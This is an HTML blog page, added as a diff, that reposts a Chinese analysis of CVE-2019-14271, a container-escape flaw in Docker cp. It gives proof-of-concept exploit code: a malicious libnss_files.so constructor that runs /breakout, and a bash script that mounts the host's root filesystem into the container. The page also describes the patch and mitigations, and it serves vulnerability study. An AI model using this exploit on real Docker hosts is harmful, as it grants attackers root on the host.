@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Docker cp漏洞分析 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-cp"><span class="toc-text">Docker cp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-14271"><span class="toc-text">CVE-2019-14271</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#补丁"><span class="toc-text">补丁</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Docker cp漏洞分析
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-11-05 16:42:27</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#docker cp" title="docker cp">docker cp</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#CVE-2019-14271" title="CVE-2019-14271">CVE-2019-14271</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 本文转自<a href="https://www.anquanke.com/post/id/193218" target="_blank" rel="noopener">安全客</a></p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271" target="_blank" rel="noopener">CVE-2019-14271</a>是Docker <code>cp</code>命令实现中存在的一个安全问题，攻击者可以利用该漏洞实现完整的容器逃逸。这是从2月份<code>runC</code><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/" target="_blank" rel="noopener">漏洞</a>公布以来第一个容器逃逸类漏洞。 </p>
+<h1 id="Docker-cp"><a href="#Docker-cp" class="headerlink" title="Docker cp"></a>Docker cp</h1><p>我们可以使用<code>copy</code>命令，将文件拷贝至/拷贝出容器，也可以在容器间相互拷贝。命令语法非常简单，与标准的Unix <code>cp</code>命令类似。为了从容器中拷贝出<code>/var/logs</code>，我们可以使用该语法：<code>docker cp container_name:/var/logs /some/host/path</code>。 </p>
+<p>如下图所示，为了将文件从容器中拷出，Docker使用了一个辅助进程：<code>docker-tar</code>。 </p>
+<p><img src="/images/b4/1.png" alt="img"></p>
+<p> <code>docker-tar</code>的原理是<a href="https://man.linuxde.net/chroot" target="_blank" rel="noopener">chroot</a>（ <strong>chroot命令</strong>用来在指定的根目录下运行指令 ）到容器中（如下图所示），归档其中请求的文件及目录，然后将生成的<code>tar</code>文件传回Docker守护进程，该进程负责将文件提取到宿主机上的目标目录中。 </p>
+<p><img src="/images/b4/2.png" alt="img"></p>
+<p>执行<code>chroot</code>操作最主要的目的是避免符号链接（symlink）攻击，当宿主机进程尝试访问容器中的文件时就可能发生这种攻击。如果其中某个文件为符号链接，那么就可能被解析到宿主机的根目录，这样攻击者控制的容器就有可能通过容器的<code>cp</code>命令在宿主机上读取并写入文件。在过去一年中，<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15664" target="_blank" rel="noopener">Docker</a>及<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10152" target="_blank" rel="noopener">Podman</a>中已经有多个CVE与符号链接有关。通过<code>chroot</code>到容器根目录，<code>docker-tar</code>就可以确保所有的符号链接已被正确解析。 </p>
+<p>不幸的是，<code>chroot</code>到容器中存在一个副作用，当从容器中拷贝文件时，会造成更严重的后果。 </p>
+<h2 id="CVE-2019-14271"><a href="#CVE-2019-14271" class="headerlink" title="CVE-2019-14271"></a>CVE-2019-14271</h2><p>Docker采用Golang编写，更具体一些，存在漏洞的Docker版本采用Go v1.11编译。在这个版本中，包含嵌入式C代码（<code>cgo</code>）的某些package会在运行时动态加载共享库。这些package包括<code>net</code>及<code>os/user</code>，<code>docker-tar</code>都用到了这两个package，会在运行时动态加载一些<code>libnss_*.so</code>库。正常情况下，程序库会从宿主机的文件系统中加载，然而由于<code>docker-tar</code>会<code>chroot</code>到容器中，因此会从容器的文件系统中加载这些库。这意味着<code>docker-tar</code>会加载并执行受容器控制的代码。</p>
+<p>这里要澄清一点：除了<code>chroot</code>到容器文件系统中之外，<code>docker-tar</code>并没有被容器化。<code>docker-tar</code>运行在宿主机命名空间中，具备所有root功能，并且没有受<code>cgroups</code>以及<code>seccomp</code>限制。因此，攻击者可以将代码注入到<code>docker-tar</code>，就可以通过恶意容器获得宿主机的完整root访问权限。</p>
+<p>当Docker用户从如下几种容器中拷贝文件时，就存在被攻击的风险：</p>
+<ul>
+<li>运行恶意镜像的容器，其中带有恶意的<code>libnss_*.so</code>库；</li>
+<li>攻击者在被入侵的容器中替换<code>libnss_*.so</code>库。</li>
+</ul>
+<p>在这两种情况下，攻击者都可以获得宿主机上的root代码执行权限。</p>
+<p>有趣的是，研究人员实际上是从某个<a href="https://github.com/moby/moby/issues/39449" target="_blank" rel="noopener">GitHub issue</a>中发现了该漏洞，当时用户尝试从某个<code>debian:buster-slim</code>容器中拷贝文件，但<code>docker cp</code>命令总是无法成功执行。当时的问题在于该镜像并没有包含<code>libnss</code>库，因此当用户运行<code>docker cp</code>命令，<code>docker-tar</code>进程尝试从容器系统中加载这些库时，就会出现错误。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了利用CVE-2019-14271，我们需要构建一个恶意的<code>libnss</code>库，这里我选择的是<code>libnss_files.so</code>。我下载了该库的源代码，在源文件中添加了一个函数：<code>run_at_link()</code>。我还使用<a href="https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html" target="_blank" rel="noopener">constructor</a>属性来定义该函数。<code>constructor</code>属性（GCC特定语法）表示<code>run_at_link</code>函数会在目标库被进程加载时作为初始化函数来执行，这意味着当<code>docker-tar</code>进程动态加载我们的恶意库时，<code>run_at_link</code>就会被执行。<code>run_at_link</code>代码如下所示，这里我做了适当精简：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> ...</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIGINAL_LIBNSS <span class="meta-string">"/original_libnss_files.so.2"</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIBNSS_PATH <span class="meta-string">"/lib/x86_64-linux-gnu/libnss_files.so.2"</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">__attribute__ ((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">run_at_link</span><span class="params">(<span class="keyword">void</span>)</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">char</span> * argv_break[<span class="number">2</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (!is_priviliged())</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">           <span class="keyword">return</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">     <span class="built_in">fprintf</span>(log_fp, <span class="string">"switched back to the original libnss_file.so"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (!fork())</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">     &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">           <span class="comment">// Child runs breakout</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">           argv_break[<span class="number">0</span>] = strdup(<span class="string">"/breakout"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">           argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">           execve(<span class="string">"/breakout"</span>, argv_break, <span class="literal">NULL</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">           wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">return</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">     FILE * proc_file = fopen(<span class="string">"/proc/self/exe"</span>, <span class="string">"r"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (proc_file != <span class="literal">NULL</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">     &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">           fclose(proc_file);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// can open so /proc exists, not privileged</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">     &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we're running in the context of docker-tar</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p><code>run_at_link</code>首先会验证代码运行在<code>docker-tar</code>上下文中，这是因为其他正常的容器进程也可能加载该库。代码通过检查<code>/proc</code>目录完成该操作。如果<code>run_at_link</code>运行在<code>docker-tar</code>上下文中，那么该目录将为空，这是因为挂载到<code>/proc</code>的<code>procfs</code>只存在于容器的<code>mount</code>命名空间中。</p>
+<p>接下来，<code>run_at_link</code>会将恶意库替换为原始的<code>libnss</code>库。这样能确保利用代码运行的后续进程不会意外加载恶意库，避免再次执行<code>run_at_link</code>。</p>
+<p>随后，为了简化利用过程，<code>run_at_link</code>会尝试运行容器中的<code>/breakout</code>可执行文件。这样后续利用代码就可以在bash中完成，不需要依赖于C。后续利用逻辑不受限于<code>run_at_link</code>，这也意味着当利用代码有改动时，我们不需要每次都重新编译恶意库，只需要修改<code>breakout</code>程序即可。</p>
+<p>如<a href="https://asciinema.org/a/HfdKQKFn7Cn67e5QLWm9gzFfT" target="_blank" rel="noopener">下图</a>所示，当Docker用户运行恶意镜像（其中包含我们的恶意<code>libnss_files.so</code>库），尝试从容器中拷贝某些日志文件时，镜像中的<code>/breakout</code>程序就会执行。这里的<code>/breakout</code>是一个简单的bash脚本，会将宿主文件系统加载到容器的<code>/host_fs</code>，并将信息写入宿主机上的<code>/evil</code>。</p>
+<p><img src="/images/b4/3.png" alt="img"></p>
+<p><code>/breakout</code>脚本源码如下所示。为了获取宿主机根文件系统的引用，脚本将<code>procfs</code>挂载到<code>/proc</code>。由于<code>docker-tar</code>运行在宿主机的<code>PID</code>命名空间中，被挂载的<code>procfs</code>将会包含宿主机进程中的数据。该脚本随后会挂载宿主机<code>PID 1</code>的根目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">umount /host_fs &amp;&amp; rm -rf /host_fs</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">mkdir /host_fs</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">mount -t proc none /proc     <span class="comment"># mount the host's procfs over /proc</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /proc/1/root              <span class="comment"># chdir to host's root</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">mount --<span class="built_in">bind</span> . /host_fs      <span class="comment"># mount host root at /host_fs</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Hello from within the container!"</span> &gt; /host_fs/evil</span></pre></td></tr></table></figure>
+
+<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>漏洞<a href="https://github.com/moby/moby/pull/39612" target="_blank" rel="noopener">补丁</a>修复了<code>docker-tar</code>的<code>init</code>函数，避免存在问题的Go package调用任意函数。补丁强制<code>docker-tar</code>在<code>chroot</code>到容器前，先从宿主机系统中加载<code>libnss</code>库。</p>
+<p><img src="/images/b4/4.png" alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果某个漏洞能够在宿主机上执行代码，那该漏洞将非常危险。用户应确保当前运行<a href="https://docs.docker.com/engine/release-notes/#19031" target="_blank" rel="noopener">19.03.1</a>版或更高版本的Docker，这些版本中已经修复了该问题。为了限制这类漏洞的攻击面，我建议大家永远不要运行不可信的镜像。</p>
+<p>此外，如果不是特殊情况，我建议大家以非<code>root</code>用户运行容器，这样能进一步提高容器安全性，避免攻击者利用容器引擎或者内核中存在的各种问题。对于CVE-2019-14271漏洞，如果容器以非<code>root</code>用户运行，那么当前环境仍然安全。即便攻击者成功入侵容器，也无法覆盖容器的<code>libnss</code>库，因为这些库归<code>root</code>所有，因此攻击者无法利用该漏洞。Ariel Zelivansky还发表过一篇<a href="https://unit42.paloaltonetworks.com/non-root-containers-kubernetes-cve-2019-11245-care/" target="_blank" rel="noopener">文章</a>，其中介绍了以非<code>root</code>用户运行容器的各种优点，供大家参考。</p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
